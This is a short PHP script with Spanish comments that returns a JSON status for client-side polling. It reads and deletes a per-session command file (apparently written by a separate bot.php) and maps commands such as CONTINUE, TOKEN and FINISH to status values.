<?php
// Cliente: polling del estado — lee acciones/{uid}.txt (escrito por bot.php)
session_start();

header('Content-Type: application/json; charset=utf-8');

$uid = $_SESSION['wait_uid'] ?? null;
if (!$uid) {
    echo json_encode(['s' => 'wait']);
    exit;
}

$safe = preg_replace('/[^a-zA-Z0-9_-]/', '', $uid);
$f    = __DIR__ . '/acciones/' . $safe . '.txt';

if (file_exists($f)) {
    $cmd = strtoupper(trim(file_get_contents($f)));
    unlink($f);
    $map = [
        'CONTINUE' => 'continue',
        'TOKEN'    => 'token',
        'ERROR'    => 'error',
        'FINISH'   => 'finish',
        'INVALID'  => 'error',
    ];
    echo json_encode(['s' => $map[$cmd] ?? 'wait']);
} else {
    echo json_encode(['s' => 'wait']);
}
